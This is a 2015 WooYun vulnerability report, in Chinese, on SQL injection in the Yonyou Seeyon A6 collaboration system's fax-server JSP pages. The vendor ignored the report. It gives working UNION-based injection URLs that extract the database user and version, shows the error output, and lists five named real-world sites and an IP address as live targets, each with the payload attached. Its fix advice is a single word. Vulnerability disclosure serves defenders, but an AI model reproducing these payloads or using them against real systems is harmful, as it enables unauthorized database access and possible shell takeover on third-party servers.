wybug_title: 用友致远A6协同系统两处SQL注射，union可shell
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-04-07：	细节已通知厂商并且等待厂商处理中									2015-04-13：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放									2015-06-07：	细节向核心白帽子及相关领域专家公开									2015-06-17：	细节向普通白帽子公开									2015-06-27：	细节向实习白帽子公开									2015-07-12：	细节向公众公开  简要描述： 用友致远A6协同系统两处SQL注射，union可shell 详细说明：  使用量大大滴哟
/yyoa/ext/trafaxserver/New/newInfo.jsp?fax_id=wy /yyoa/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)
简单测试方法：
http://www.ssepec.net/yyoa/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20and%201=2%20union%20select%20user()%20--java.sql.SQLException: Invalid value for getInt() - 'root@localhost'
   漏洞证明：  报错注入
http://www.ssepec.net/yyoa/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20and%201=2%20union%20select%20concat(0x23,user(),0x23,@@version)%20--==》java.sql.SQLException: Invalid value for getInt() - '#root@localhost#5.0.41-community-nt'
5个案例：http://www.ssepec.net/yyoa/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20and%201=2%20union%20select%20user()%20--http://oa.wnq.com.cn/yyoa/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20and%201=2%20union%20select%20user()%20--http://110.167.194.10:8081/yyoa/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20and%201=2%20union%20select%20user()%20--http://qudao.seeyon.com/yyoa/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20and%201=2%20union%20select%20user()%20--http://www.gykghn.com:8080/yyoa/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20and%201=2%20union%20select%20user()%20--   修复方案：  过滤吧   版权声明：转载请注明来源 路人甲@乌云
